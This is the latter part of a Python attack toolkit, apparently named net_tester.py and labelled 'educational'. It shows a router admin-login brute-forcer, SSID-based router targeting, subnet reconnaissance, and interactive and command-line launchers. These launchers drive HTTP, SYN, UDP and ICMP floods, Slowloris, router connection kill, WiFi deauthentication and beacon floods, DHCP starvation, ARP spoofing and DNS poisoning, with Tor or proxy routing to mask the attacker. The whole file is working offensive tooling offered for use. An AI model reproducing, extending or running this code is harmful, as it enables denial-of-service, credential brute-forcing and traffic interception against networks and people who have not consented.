                    # Additional validation — look for admin panel markers
                    admin_markers = ["<title", "dashboard", "status", "admin",
                                    "router", "setup", "wizard", "configuration",
                                    "management", "system", "network map"]
                    if any(am in response.lower() for am in admin_markers):
                        print(f"    [SUCCESS ✓] Username: {user:<15} Password: {pwd}")
                        found = True
                        break
                    else:
                        # Might be a redirect to login or something — check more carefully
                        if "set-cookie" in response.lower() and "session" in response.lower():
                            print(f"    [SUCCESS ✓] Username: {user:<15} Password: {pwd}")
                            found = True
                            break
            else:
                print(f"    [FAILED]  {user:<15} : {pwd}")

        except (socket.timeout, ConnectionRefusedError, ConnectionResetError) as e:
            print(f"    [ERROR]   {user}:{pwd} — {type(e).__name__}")
        except Exception as e:
            pass

    if not found:
        print(f"\n[!] No valid credentials found in the list.")
        print(f"[*] Try manual credentials or a larger wordlist.")
    else:
        print(f"\n[OK] Valid credentials found!")
        print(f"[*] Router: {router_ip}:{port}")
        print(f"[*] Username: {user}")
        print(f"[*] Password: {pwd}")
        if vendor:
            print(f"[*] Vendor: {vendor}")
        print(f"[*] Access URL: http://{router_ip}:{port}")


# ──────────────────────────────────────────────────────────────────────
#  SSID‑BASED BRUTEFORCE (convenience wrapper)
# ──────────────────────────────────────────────────────────────────────

def ssid_bruteforce(target_ssid: str = None):
    """
    SSID‑Based Router Bruteforce.
    Given an SSID, auto‑detects the router, identifies vendor,
    and bruteforces the admin login.
    """
    print(f"\n╔══════════════════════════════════════════════════════════════╗")
    print(f"║           SSID‑BASED ROUTER LOGIN BRUTEFORCE               ║")
    print(f"╚══════════════════════════════════════════════════════════════╝")

    if not target_ssid:
        # Scan and let user pick
        networks = scan_wifi_networks()
        if not networks:
            print("[X] No WiFi networks found.")
            print("[*] Make sure WiFi is enabled and you're in range.")
            target_ssid = input("[+] Enter SSID manually: ").strip()
        else:
            print(f"\n[*] Found {len(networks)} WiFi networks:")
            seen = set()
            unique_nets = []
            for net in networks:
                ssid = net.get("ssid", "(hidden)")
                if ssid not in seen:
                    seen.add(ssid)
                    unique_nets.append(net)

            for i, net in enumerate(unique_nets):
                bssid_val = net.get("bssid", "?")
                vendor_val = get_oui_lookup(bssid_val)
                ch = net.get("channel", "?")
                sig = net.get("signal", "?")
                auth = net.get("auth", "?")
                print(f"    {i+1:>2}. {net['ssid']:<30} [{vendor_val}]")
                print(f"        BSSID: {bssid_val}  Ch: {ch}  Sig: {sig}  Auth: {auth}")

            sel = input(f"\n[+] Select SSID (1-{len(unique_nets)}) or type SSID name: ").strip()
            try:
                idx = int(sel) - 1
                if 0 <= idx < len(unique_nets):
                    target_ssid = unique_nets[idx]["ssid"]
                    print(f"[*] Selected: {target_ssid}")
            except ValueError:
                target_ssid = sel

    if not target_ssid:
        print("[X] No SSID provided. Aborting.")
        return

    print(f"\n[*] Target SSID: {target_ssid}")
    print("[*] Step 1: Locating router IP...")

    router_ip, vendor, bssid = find_router_by_ssid(target_ssid)

    if not router_ip:
        print("[X] Could not find router. Enter IP manually:")
        router_ip = input("[+] Router IP: ").strip()
        if not router_ip:
            return

    print(f"\n[*] Step 2: Bruteforcing router login at {router_ip}...")
    router_login_bruteforce(router_ip, vendor=vendor, bssid=bssid)


# ──────────────────────────────────────────────────────────────────────
#  NETWORK RECONNAISSANCE
# ──────────────────────────────────────────────────────────────────────

def network_reconnaissance(target_subnet: str = None):
    """Comprehensive network reconnaissance."""
    print(f"\n╔══════════════════════════════════════════════════════════════╗")
    print(f"║              NETWORK RECONNAISSANCE                         ║")
    print(f"╚══════════════════════════════════════════════════════════════╝")

    if not target_subnet:
        router_ip = get_default_gateway()
        local_ip = get_local_ip()
        if router_ip:
            parts = router_ip.split('.')
            target_subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
            print(f"\n[*] Auto-detected subnet: {target_subnet}")
        else:
            target_subnet = input("\n[+] Target subnet (e.g., 192.168.1.0/24): ").strip()

    print(f"[*] Local IP: {get_local_ip()}")
    print(f"[*] Router IP: {get_default_gateway()}")
    print(f"\n[*] Scanning network...\n")

    try:
        network = ipaddress.IPv4Network(target_subnet, strict=False)
    except ValueError:
        print(f"[X] Invalid subnet: {target_subnet}")
        return

    discovered_devices = []
    ping_cmd = ["ping", "-n", "1", "-w", "1000"] if IS_WINDOWS else ["ping", "-c", "1", "-W", "1"]

    def probe_host(ip_str):
        if stop_event.is_set():
            return None
        info = {"ip": ip_str, "mac": "", "vendor": "", "hostname": "", "open_ports": []}

        # ARP ping (Linux only with Scapy)
        if not IS_WINDOWS and SCAPY_AVAILABLE and check_root():
            try:
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_str),
                            timeout=0.5, verbose=0)
                for _, rcv in ans:
                    info["mac"] = rcv[Ether].src
                    info["vendor"] = get_oui_lookup(info["mac"])
            except Exception:
                pass

        # ICMP ping (works everywhere)
        try:
            result = subprocess.run(
                ping_cmd + [ip_str], capture_output=True, text=True, timeout=2
            )
            if result.returncode == 0:
                try:
                    info["hostname"] = socket.gethostbyaddr(ip_str)[0]
                except Exception:
                    pass
                for port in [80, 443, 22, 23, 8080, 8443, 53, 21, 445, 3389]:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.3)
                        if s.connect_ex((ip_str, port)) == 0:
                            info["open_ports"].append(port)
                        s.close()
                    except Exception:
                        pass
                return info
        except Exception:
            pass
        return None

    hosts = list(network.hosts())
    print(f"[*] Probing {len(hosts)} hosts...\n")

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(probe_host, str(ip)): str(ip) for ip in hosts}
        for future in as_completed(futures):
            result = future.result()
            if result:
                discovered_devices.append(result)

    print(f"\n{'='*70}")
    print(f"  NETWORK RECONNAISSANCE RESULTS")
    print(f"{'='*70}")
    print(f"  Subnet: {target_subnet} | Live hosts: {len(discovered_devices)}")
    print(f"{'='*70}\n")

    router_ip = get_default_gateway()
    router_info = None

    for device in sorted(discovered_devices, key=lambda x: ipaddress.IPv4Address(x['ip'])):
        is_router = (device['ip'] == router_ip)
        marker = " ← ROUTER" if is_router else ""
        print(f"  IP: {device['ip']:<15} {marker}")
        if device['mac']:
            print(f"     MAC:        {device['mac']}")
        if device['vendor']:
            print(f"     Vendor:     {device['vendor']}")
        if device['hostname']:
            print(f"     Hostname:   {device['hostname']}")
        if device['open_ports']:
            print(f"     Open Ports: {sorted(device['open_ports'])}")
        print()
        if is_router:
            router_info = device

    if router_info:
        print(f"{'='*70}")
        print(f"  ROUTER ANALYSIS: {router_info['ip']}")
        print(f"{'='*70}")
        print(f"  Manufacturer: {router_info['vendor'] or 'Unknown'}")
        print(f"  MAC Address:  {router_info['mac'] or 'Unknown'}")
        print(f"  Open Ports:   {router_info['open_ports'] or 'None detected'}")
        for port in [80, 8080, 443, 8443]:
            if port in router_info['open_ports']:
                try:
                    import urllib.request
                    req = urllib.request.Request(f"http://{router_info['ip']}:{port}/",
                                                  headers={"User-Agent": USER_AGENTS[0]})
                    resp = urllib.request.urlopen(req, timeout=3)
                    html = resp.read().decode(errors='ignore')
                    if "<title>" in html:
                        title = html.split("<title>")[1].split("</title>")[0]
                        print(f"  Admin Title:  {title}")
                    break
                except Exception:
                    pass
        print(f"\n  [*] Try: http://{router_info['ip']}")

    print(f"\n{'='*70}")
    print(f"  Reconnaissance complete. {len(discovered_devices)} devices found.")
    print(f"{'='*70}")


# ──────────────────────────────────────────────────────────────────────
#  INTERACTIVE MENU
# ──────────────────────────────────────────────────────────────────────

def ask_target_type():
    """Ask user what type of target."""
    print("\n" + "─" * 62)
    print("[?] Select Attack Category:")
    print("─" * 62)
    print("    1. Web Server / Domain Attack")
    print("    2. IP Address Attack")
    print("    3. Router Disruption (Kill router connection)")
    print("    4. WiFi Attack (Deauth, Beacon Flood)")
    print("    5. MITM Attack (ARP Spoofing, DNS Poisoning) [Linux only]")
    print("    6. Network Reconnaissance")
    print("    7. Router Login Bruteforce (IP or SSID)")
    print("    8. SSID‑Based Router Bruteforce (NEW — auto‑detect!)")
    print("    9. IPv4 Raw Network Attack [Linux only]")
    print("─" * 62)
    while True:
        choice = input("    Enter 1-9: ").strip()
        mapping = {
            "1": "domain", "2": "ip", "3": "router_kill",
            "4": "wifi", "5": "mitm", "6": "recon",
            "7": "router_bruteforce", "8": "ssid_bruteforce", "9": "ipv4_raw"
        }
        if choice in mapping:
            return mapping[choice]
        print("    [!] Please enter 1-9.")


def ask_host(target_type: str) -> str:
    """Ask user for target host/IP."""
    if target_type == "router_kill":
        router_ip = get_default_gateway()
        if router_ip:
            print(f"\n[*] Auto-detected router: {router_ip}")
            use = input(f"    Use this router? (y/n) [y]: ").strip().lower()
            if use != "n":
                return router_ip
    prompt_map = {
        "domain": "[+] Domain: ",
        "ip": "[+] IP Address: ",
        "router_kill": "[+] Router IP: ",
        "wifi": "[+] Target BSSID or SSID: ",
        "mitm": "[+] Target IP (for ARP spoofing): ",
        "recon": "[+] Subnet (Enter=auto-detect): ",
        "router_bruteforce": "[+] Router IP (Enter=auto-detect): ",
        "ssid_bruteforce": "[+] SSID (Enter=scan): ",
        "ipv4_raw": "[+] Target IP: ",
    }
    h = input(prompt_map.get(target_type, "[+] Host: ")).strip()
    return h


def ask_threads(default: int = MAX_WORKERS_DEFAULT) -> int:
    """Ask user for thread count."""
    print(f"\n[?] Number of worker threads [{default}]:")
    print(f"    • 100-200: Light | 200-400: Moderate | 400-600: Heavy | 600-1000: Extreme")
    a = input(f"    Threads [{default}]: ").strip()
    if not a:
        return default
    try:
        return min(max(int(a), 1), 1000)
    except ValueError:
        return default


def ask_scan() -> bool:
    """Ask whether to scan ports."""
    return input("\n[?] Run port scan first? (y/n) [y]: ").strip().lower() != "n"


def ask_stealth_scan() -> bool:
    """Ask for stealth SYN scan."""
    if IS_WINDOWS:
        print("[!] SYN stealth scan not available on Windows — using TCP connect.")
        return False
    return input("[?] Use SYN stealth scan? (y/n) [n] (requires root): ").strip().lower() == "y"


def ask_ssl() -> bool:
    """Ask for SSL."""
    return input("\n[?] Use SSL/HTTPS? (y/n) [n]: ").strip().lower() == "y"


def ask_use_tor() -> bool:
    """Ask for Tor routing."""
    print("\n[?] Route through Tor network? (y/n) [n]:")
    return input("    Use Tor? ").strip().lower() == "y"


def ask_proxy_config(proxy_mgr: ProxyManager) -> ProxyManager:
    """Ask user about proxy/VPN configuration."""
    print("\n[?] Configure Proxy / VPN Bots for IP masking?")
    print("    1. Use Tor      2. Custom SOCKS5   3. Custom HTTP")
    print("    4. All common    5. Load list       6. No proxies")
    while True:
        choice = input("    Enter choice (1-6) [6]: ").strip() or "6"
        if choice == "1":
            proxy_mgr.add_tor()
        elif choice == "2":
            addr = input("    SOCKS5 proxy (host:port): ").strip()
            if addr:
                proxy_mgr.add_custom_proxy(f"socks5://{addr}")
        elif choice == "3":
            addr = input("    HTTP proxy (host:port): ").strip()
            if addr:
                proxy_mgr.add_custom_proxy(f"http://{addr}")
        elif choice == "4":
            proxy_mgr.add_tor()
            proxy_mgr.add_common_vpn_proxies()
        elif choice == "5":
            print("    Enter proxy addresses (one per line, blank to finish):")
            while True:
                line = input("      > ").strip()
                if not line:
                    break
                proxy_mgr.add_custom_proxy(line)
        elif choice == "6":
            break
        more = input("    Add more? (y/n) [n]: ").strip().lower()
        if more != "y":
            break
    if proxy_mgr.proxies:
        proxy_mgr.list_proxies()
    return proxy_mgr


def choose_attack_method(target_type: str) -> str:
    """Present attack method menu."""
    print("\n" + "─" * 62)
    print("[?] Choose Attack Method:")
    print("─" * 62)

    if target_type in ("domain", "ip"):
        print("    1. HTTP/HTTPS Flood    2. SYN Flood [Linux root]")
        print("    3. UDP Flood           4. ICMP Flood [Linux/macOS root]")
        print("    5. Tor's Hammer/Slowloris  6. Multi‑Vector Assault")
        print("    7. IPv4 Raw Network Attack [Linux root]")
        mapping = {"1": "http_flood", "2": "syn_flood", "3": "udp_flood",
                   "4": "icmp_flood", "5": "tors_hammer", "6": "multi_vector",
                   "7": "ipv4_raw"}
    elif target_type == "router_kill":
        print("    1. Router Connection Kill   2. HTTP Flood on Router")
        print("    3. Slowloris on Router      4. Multi-Vector Router Assault")
        mapping = {"1": "router_kill", "2": "router_http_flood",
                   "3": "router_slowloris", "4": "router_multi"}
    elif target_type == "wifi":
        print("    1. WiFi Deauth [Windows + Linux]   2. WiFi Beacon Flood [Linux]")
        print("    3. DHCP Starvation [Linux]")
        mapping = {"1": "wifi_deauth", "2": "wifi_beacon", "3": "dhcp_starve"}
    elif target_type == "mitm":
        print("    1. ARP Spoofing [Linux]   2. DNS Poisoning [Linux]")
        mapping = {"1": "arp_spoof", "2": "dns_poison"}
    elif target_type == "recon":
        return "network_recon"
    elif target_type == "router_bruteforce":
        # Offer both IP and SSID modes
        print("    1. Direct IP Bruteforce")
        print("    2. SSID‑Based Bruteforce (auto‑detect router)")
        while True:
            ch = input("    Enter 1-2: ").strip()
            if ch == "1":
                return "router_bruteforce"
            elif ch == "2":
                return "ssid_bruteforce"
            print("    [!] Enter 1 or 2.")
    elif target_type == "ssid_bruteforce":
        return "ssid_bruteforce"
    elif target_type == "ipv4_raw":
        return "ipv4_raw"
    else:
        return "http_flood"

    if target_type not in ("router_bruteforce",):
        print("─" * 62)
        print("    Type 'explain <number>' for detailed explanation")

    explain_map = {f"explain {k}": v for k, v in mapping.items()}
    while True:
        choice = input("    Enter choice: ").strip().lower()
        if choice in explain_map:
            key = explain_map[choice]
            print(ATTACK_EXPLANATIONS.get(key, "No detailed explanation available."))
            continue
        if choice in mapping:
            return mapping[choice]
        print(f"    [!] Enter one of: {', '.join(sorted(mapping.keys()))} (or 'explain N')")


def ask_delay() -> int:
    """Ask for delay in ms for Tor's Hammer."""
    a = input("\n[+] Delay between Slowloris sends (ms) [500]: ").strip()
    if not a:
        return 500
    try:
        return max(10, min(int(a), 10000))
    except ValueError:
        return 500


def ask_payload_size(default: int = 1024) -> int:
    """Ask for payload size."""
    a = input(f"\n[+] Payload size in bytes [{default}]: ").strip()
    if not a:
        return default
    try:
        return max(1, min(int(a), 65507))
    except ValueError:
        return default


# ──────────────────────────────────────────────────────────────────────
#  MAIN
# ──────────────────────────────────────────────────────────────────────

def main():
    """Main entry point — interactive mode."""
    global stop_event, packets_sent, bytes_sent, start_time

    banner()

    print(f"[*] Platform: {platform.system()} {platform.release()}")
    if IS_WINDOWS:
        print("[*] NOTE: Raw socket attacks (SYN, ICMP, IPv4 Raw, WiFi-Scapy, MITM)")
        print("[*]       are limited on Windows. Use HTTP/UDP/Slowloris/WiFi-netsh instead.")
        print("[*]       WiFi Deauth via netsh IS available on Windows!")
        print("[*]       SSID-Based Router Bruteforce IS available on Windows!")
    print()

    # Step 1: Target type
    target_type = ask_target_type()

    # Handle SSID bruteforce
    if target_type == "ssid_bruteforce":
        reset_state()
        start_time = time.time()
        ssid_bruteforce()
        return

    # Handle recon
    if target_type == "recon":
        subnet = ask_host(target_type)
        reset_state()
        start_time = time.time()
        network_reconnaissance(subnet if subnet else None)
        return

    # Handle router bruteforce
    if target_type == "router_bruteforce":
        router_ip = ask_host(target_type)
        reset_state()
        start_time = time.time()
        router_login_bruteforce(router_ip if router_ip else None)
        return

    # Handle router kill
    if target_type == "router_kill":
        router_ip = ask_host(target_type)
        threads = ask_threads(200)
        print(f"\n{'─' * 62}")
        print(f"[*] Target: Router at {router_ip} | Workers: {threads}")
        print(f"{'─' * 62}")
        confirm = input("\n[!] CONFIRM LAUNCH? This will disrupt the network! (yes/no): ").strip().lower()
        if confirm != "yes":
            print("[*] Aborted.")
            return
        reset_state()
        start_time = time.time()
        try:
            router_connection_kill(router_ip, threads)
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Stopped. {format_rate()}")
        return

    # Handle WiFi attacks
    if target_type == "wifi":
        attack_method = choose_attack_method(target_type)
        reset_state()
        start_time = time.time()
        try:
            if attack_method == "wifi_deauth":
                wifi_deauth_attack()
            elif attack_method == "wifi_beacon":
                if IS_WINDOWS:
                    print("[X] WiFi Beacon Flood not available on Windows.")
                else:
                    wifi_beacon_flood()
            elif attack_method == "dhcp_starve":
                dhcp_starvation_attack()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Stopped. {format_rate()}")
        return

    # Handle MITM attacks
    if target_type == "mitm":
        if IS_WINDOWS:
            print("[X] MITM attacks are NOT available on Windows. Requires Linux + Scapy.")
            return
        attack_method = choose_attack_method(target_type)
        reset_state()
        start_time = time.time()
        try:
            if attack_method == "arp_spoof":
                router_ip = get_default_gateway()
                target_ip = input("[+] Target IP to poison (or 'all' for subnet): ").strip()
                arp_spoof_attack(target_ip, router_ip)
            elif attack_method == "dns_poison":
                dns_poisoning_attack()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Stopped. {format_rate()}")
        return

    # Standard attack flow
    host_input = ask_host(target_type)
    resolve_as = "ip" if target_type in ("ip", "ipv4_raw") else "domain"
    ip, display_name = resolve_target(host_input, resolve_as)

    open_ports = []
    do_scan = ask_scan()
    if do_scan:
        stealth = ask_stealth_scan()
        open_ports = scan_ports(ip, stealth=stealth)

    attack_method = choose_attack_method(target_type)

    port = 80
    use_ssl = False
    use_tor = False
    threads = MAX_WORKERS_DEFAULT
    delay_ms = 500
    payload_size = 1024
    proxy_mgr = ProxyManager()

    if attack_method in ("http_flood", "tors_hammer", "multi_vector",
                         "router_http_flood", "router_slowloris", "router_multi"):
        proxy_mgr = ask_proxy_config(proxy_mgr)

    if attack_method == "ipv4_raw":
        if IS_WINDOWS:
            print("[X] IPv4 Raw Attack is NOT available on Windows.")
            return
        threads = ask_threads(500)
        print(f"\n[*] Target: {display_name} ({ip})")
        confirm = input("\n[!] LAUNCH IPv4 RAW ATTACK? (yes/no): ").strip().lower()
        if confirm != "yes":
            print("[*] Aborted.")
            return
        reset_state()
        start_time = time.time()
        ipv4_raw_attack(ip, threads)
        return

    if open_ports:
        port = pick_port(open_ports)
    else:
        port = ask_port_manual()

    if attack_method in ("http_flood", "multi_vector", "tors_hammer",
                         "router_http_flood", "router_slowloris", "router_multi"):
        use_ssl = ask_ssl()

    if attack_method in ("tors_hammer", "router_slowloris"):
        threads = ask_threads(200)
        delay_ms = ask_delay()
        use_tor = ask_use_tor()
        if use_tor and not proxy_mgr.proxies:
            proxy_mgr.add_tor()
    elif attack_method in ("http_flood", "router_http_flood"):
        threads = ask_threads()
    elif attack_method == "syn_flood":
        if IS_WINDOWS:
            print("[X] SYN Flood not available on Windows.")
            return
        threads = ask_threads(300)
        if not check_root():
            print("[!] SYN Flood requires root!")
    elif attack_method == "udp_flood":
        threads = ask_threads(300)
        payload_size = ask_payload_size()
    elif attack_method == "icmp_flood":
        if IS_WINDOWS:
            print("[X] ICMP Flood not available on Windows.")
            return
        threads = ask_threads(200)
        payload_size = ask_payload_size(64)
        if not check_root():
            print("[!] ICMP Flood requires root.")
    elif attack_method in ("multi_vector", "router_multi"):
        threads = ask_threads(400)

    # Handle router-specific attacks
    if attack_method in ("router_http_flood", "router_slowloris", "router_multi"):
        router_ip = get_default_gateway()
        if router_ip and router_ip != ip:
            print(f"\n[!] Note: Router detected at {router_ip}")
            use_router = input(f"    Target router ({router_ip}) instead? (y/n) [y]: ").strip().lower()
            if use_router != "n":
                ip = router_ip
                display_name = "Router"

    # Confirmation
    print(f"\n{'─' * 62}")
    print(f"[*] Target:      {display_name} ({ip}:{port})")
    print(f"[*] Method:      {attack_method}")
    print(f"[*] Workers:     {threads} (INFINITE packets)")
    print(f"[*] SSL:         {use_ssl} | Proxies: {len(proxy_mgr.proxies)}")
    if attack_method in ("tors_hammer", "router_slowloris"):
        print(f"[*] Tor: {use_tor} | Delay: {delay_ms}ms")
    print(f"{'─' * 62}")

    confirm = input("\n[!] CONFIRM LAUNCH? (yes/no): ").strip().lower()
    if confirm != "yes":
        print("[*] Aborted.")
        return

    reset_state()
    start_time = time.time()

    try:
        if attack_method == "http_flood":
            http_flood(ip, port, display_name, threads, use_ssl, proxy_mgr)
        elif attack_method == "syn_flood":
            syn_flood(ip, port, threads)
        elif attack_method == "udp_flood":
            udp_flood(ip, port, threads, payload_size)
        elif attack_method == "icmp_flood":
            icmp_flood(ip, threads, payload_size)
        elif attack_method == "tors_hammer":
            tors_hammer(ip, port, display_name, threads, use_ssl, use_tor, delay_ms, proxy_mgr)
        elif attack_method == "multi_vector":
            multi_vector_assault(ip, port, display_name, threads, use_ssl, proxy_mgr)
        elif attack_method == "router_http_flood":
            http_flood(ip, port, display_name, threads, use_ssl, proxy_mgr)
        elif attack_method == "router_slowloris":
            tors_hammer(ip, port, display_name, threads, use_ssl, use_tor, delay_ms, proxy_mgr)
        elif attack_method == "router_multi":
            multi_vector_assault(ip, port, display_name, threads, use_ssl, proxy_mgr)
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n[!] Stopped. {format_rate()}")

    print(f"\n[Done] {format_rate()}")


def reset_state():
    """Reset global state for a new attack."""
    global stop_event, packets_sent, bytes_sent, start_time, router_disruption_active
    stop_event.clear()
    with packets_lock:
        packets_sent = 0
        bytes_sent = 0
    start_time = None
    router_disruption_active = False


# ──────────────────────────────────────────────────────────────────────
#  CLI MODE (non‑interactive)
# ──────────────────────────────────────────────────────────────────────

def cli_mode():
    """Command‑line interface for scripting."""
    parser = argparse.ArgumentParser(
        description="Comprehensive Network Security Tester (Educational) — Cross-Platform",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
        Examples:
          python net_tester.py --mode http --host example.com --port 80 --threads 300
          python net_tester.py --mode deauth --ssid "MyWiFi"
          python net_tester.py --mode ssid-bruteforce --ssid "MyWiFi"
          python net_tester.py --mode deauth --bssid AA:BB:CC:DD:EE:FF --interface wlan0mon
          python net_tester.py --mode router-bruteforce --host 192.168.1.1

        Windows‑only deauth:
          python net_tester.py --mode deauth --ssid "TargetWiFi"    (uses netsh)

        SSID‑Based Bruteforce:
          python net_tester.py --mode ssid-bruteforce --ssid "TargetWiFi"
          python net_tester.py --mode ssid-bruteforce              (scans & prompts)
        """)
    )

    parser.add_argument("--mode", required=True,
                        choices=["http", "syn", "udp", "icmp", "tors",
                                 "multi", "ipv4-raw", "scan",
                                 "router-kill", "deauth", "wifi-deauth",
                                 "wifi-beacon", "dhcp-starve", "arp-spoof",
                                 "dns-poison", "recon", "router-bruteforce",
                                 "ssid-bruteforce"],
                        help="Attack mode")
    parser.add_argument("--host", help="Target domain or IP")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--threads", type=int, default=300, help="Worker threads")
    parser.add_argument("--ssl", action="store_true", help="Use SSL/HTTPS")
    parser.add_argument("--tor", action="store_true", help="Route through Tor")
    parser.add_argument("--delay", type=int, default=500, help="Slowloris delay in ms")
    parser.add_argument("--payload", type=int, default=1024, help="Payload size")
    parser.add_argument("--scan-ports", action="store_true", help="Auto‑scan ports")
    parser.add_argument("--proxy", action="append", default=[], help="Proxy address")
    parser.add_argument("--bssid", help="Target AP BSSID for WiFi attacks")
    parser.add_argument("--client", help="Target client MAC for deauth")
    parser.add_argument("--interface", help="Network interface")
    parser.add_argument("--channel", type=int, help="WiFi channel")
    parser.add_argument("--gateway", help="Gateway/router IP")
    parser.add_argument("--subnet", help="Target subnet for recon")
    parser.add_argument("--ssid", help="Target SSID (for deauth or SSID bruteforce)")
    parser.add_argument("--spoof-domain", help="Domain to spoof in DNS poisoning")
    parser.add_argument("--spoof-ip", help="IP to redirect to in DNS poisoning")

    args = parser.parse_args()

    # Warn about platform-restricted modes
    linux_only = ["syn", "icmp", "ipv4-raw", "wifi-beacon", "dhcp-starve",
                  "arp-spoof", "dns-poison"]
    if args.mode in linux_only and IS_WINDOWS:
        print(f"[X] Mode '{args.mode}' is NOT available on Windows.")
        sys.exit(1)

    # Handle SSID bruteforce
    if args.mode == "ssid-bruteforce":
        reset_state()
        global start_time
        start_time = time.time()
        ssid_bruteforce(args.ssid)
        return

    # Handle recon
    if args.mode == "recon":
        reset_state()
        start_time = time.time()
        network_reconnaissance(args.subnet)
        return

    # Handle router bruteforce
    if args.mode == "router-bruteforce":
        reset_state()
        start_time = time.time()
        router_login_bruteforce(args.host, args.port)
        return

    # Handle WiFi deauth — works on Windows too!
    if args.mode in ("deauth", "wifi-deauth"):
        reset_state()
        start_time = time.time()
        try:
            wifi_deauth_attack(
                target_bssid=args.bssid,
                client_mac=args.client,
                interface=args.interface,
                channel=args.channel,
                target_ssid=args.ssid,
            )
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Stopped. {format_rate()}")
        return

    # Handle router kill
    if args.mode == "router-kill":
        router_ip = args.host or get_default_gateway()
        if not router_ip:
            print("[X] No router IP specified.")
            sys.exit(1)
        reset_state()
        start_time = time.time()
        try:
            router_connection_kill(router_ip, args.threads)
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Stopped. {format_rate()}")
        return

    if args.mode == "wifi-beacon":
        reset_state()
        start_time = time.time()
        try:
            wifi_beacon_flood(args.interface)
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Stopped. {format_rate()}")
        return

    if args.mode == "dhcp-starve":
        reset_state()
        start_time = time.time()
        try:
            dhcp_starvation_attack(args.interface, args.host)
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Stopped. {format_rate()}")
        return

    if args.mode == "arp-spoof":
        reset_state()
        start_time = time.time()
        try:
            arp_spoof_attack(args.host, args.gateway)
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Stopped. {format_rate()}")
        return

    if args.mode == "dns-poison":
        reset_state()
        start_time = time.time()
        try:
            dns_poisoning_attack(args.host, args.gateway, args.spoof_domain, args.spoof_ip)
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Stopped. {format_rate()}")
        return

    # Standard modes
    if not args.host:
        print("[X] --host is required for this mode.")
        sys.exit(1)

    host = args.host
    try:
        socket.inet_aton(host)
        ip, display_name = host, host
    except OSError:
        try:
            ip = socket.gethostbyname(host)
            display_name = host
        except socket.gaierror:
            print(f"[X] Cannot resolve {host}")
            sys.exit(2)

    print(f"[*] Target: {display_name} ({ip})")

    if args.scan_ports:
        open_ports = scan_ports(ip)
        if open_ports:
            args.port = open_ports[0]
            print(f"[*] Using first open port: {args.port}")

    proxy_mgr = ProxyManager()
    for proxy_addr in args.proxy:
        proxy_mgr.add_custom_proxy(proxy_addr)
    if args.tor:
        proxy_mgr.add_tor()

    reset_state()
    start_time = time.time()

    try:
        if args.mode == "http":
            http_flood(ip, args.port, display_name, args.threads, args.ssl, proxy_mgr)
        elif args.mode == "syn":
            syn_flood(ip, args.port, args.threads)
        elif args.mode == "udp":
            udp_flood(ip, args.port, args.threads, args.payload)
        elif args.mode == "icmp":
            icmp_flood(ip, args.threads, args.payload)
        elif args.mode == "tors":
            tors_hammer(ip, args.port, display_name, args.threads,
                        args.ssl, args.tor, args.delay, proxy_mgr)
        elif args.mode == "multi":
            multi_vector_assault(ip, args.port, display_name, args.threads, args.ssl, proxy_mgr)
        elif args.mode == "ipv4-raw":
            ipv4_raw_attack(ip, args.threads)
        elif args.mode == "scan":
            scan_ports(ip)
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n[!] Stopped. {format_rate()}")

    print(f"\n[Done] {format_rate()}")


if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s, f: (stop_event.set(), sys.exit(0)))

    if len(sys.argv) > 1:
        cli_mode()
    else:
        main()
